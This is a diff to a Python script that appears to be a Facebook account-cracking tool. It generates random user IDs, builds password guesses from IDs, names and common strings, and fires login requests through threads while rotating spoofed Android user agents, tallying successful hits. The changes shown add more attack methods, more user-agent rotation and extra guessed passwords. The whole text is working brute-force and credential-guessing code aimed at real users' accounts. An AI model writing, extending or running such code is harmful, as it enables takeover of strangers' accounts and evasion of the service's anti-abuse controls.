@@ -1,8 +1,4 @@
-'''
-   PYC PROJECT GIFTING
---- CODE BY HERON AFRIDI 
---- GIVE CREDIT TEAM ELITE 
-'''
+
 import os, sys, uuid, re, random, time, string, json
 
 try:
@@ -280,7 +276,7 @@ def filee():
             pwx.append(px)
     else:
         print(sort.line())
-    print("[b]    [red1][1] [sea_green2]Method 1")
+    print("[b]    [red1][1] [spring_green1]Method 1")
     print("[b]    [red1][2] [spring_green1]Method 2")
     print("[b]    [red1][3] [spring_green1]Method 3")
     print("[b]    [red1][4] [spring_green1]Method 4")
@@ -304,8 +300,10 @@ def filee():
 
 
 def file_sub(uid, pwx, name, meth, file):
-    global oks, loop
+    global oks, loop, sys_ua
     Session = requests.session()
+    shadid = random.choice(sys_ua)
+    custom_agent = ""
     try:
         sys.stdout.write(
             f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
@@ -316,8 +314,7 @@ def file_sub(uid, pwx, name, meth, file):
         except:
             ls = fs
         for pw in pwx:
-            shadid = random.choice(sys_ua)
-            custom_agent = ""
+
             ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                           ls).replace(
                 'Name', name).replace('name', name.lower())
@@ -429,8 +426,11 @@ def ran():
         for i in range(limit):
             data = str(random.choice(range(10000000, 99999999)))
             user.append(data)
-    print("[b]    [red1][1] [sea_green2]Method A")
-    print("[b]    [red1][2] [spring_green1]Method B")
+    print("[b]    [red1][1] [spring_green1]Method 1")
+    print("[b]    [red1][2] [spring_green1]Method 2")
+    print("[b]    [red1][3] [spring_green1]Method 3")
+    print("[b]    [red1][4] [spring_green1]Method 4")
+    print("[b]    [red1][5] [spring_green1]Method 5")
     print(sort.line())
     meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
 
@@ -445,7 +445,7 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
             else:
-                pwx = [uid, uid[:6], uid[:7], uid[:8], xd, xd[1:], xd[2:]]
+                pwx = [uid, uid[:6], uid[:7], uid[:8], xd, xd[1:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####"]
             heron.submit(ren_sub, uid, pwx, meth, user)
 
 
@@ -453,17 +453,23 @@ def ren_sub(uid, pwx, meth, user):
     global oks, loop
     try:
         Session = requests.session()
+        shadid = random.choice(sys_ua)
+        custom_agent = ""
         sys.stdout.write(
             f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(user))}\033[38;5;46m] \r")
         sys.stdout.flush()
         for ps in pwx:
 
-            if meth in ["1", "01", "A", "a"]:
-
-                agent = "Mozilla/5.0 (Linux; Android 8.1.0; Plume L2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36"
+            if meth in ["1", "01"]:
+                agent = shadid
+            elif meth in ["2", "02"]:
+                agent = Vivo()
+            elif meth in ["3", "03"]:
+                agent = Motorola()
+            elif meth in ["4", "04"]:
+                agent = Samsung()
             else:
-
-                agent = "Mozilla/5.0 (Linux; Android 9; SM-J415F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.59 Mobile Safari/537.36 OcIdWebView ({\x22os\x22:\x22Android\x22,\x22osVersion\x22:\x2228\x22,\x22app\x22:\x22com.google.android.gms\x22,\x22appVersion\x22:\x22219\x22,\x22style\x22:2,\x22isDarkTheme\x22:false})"
+                agent = custom_agent
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
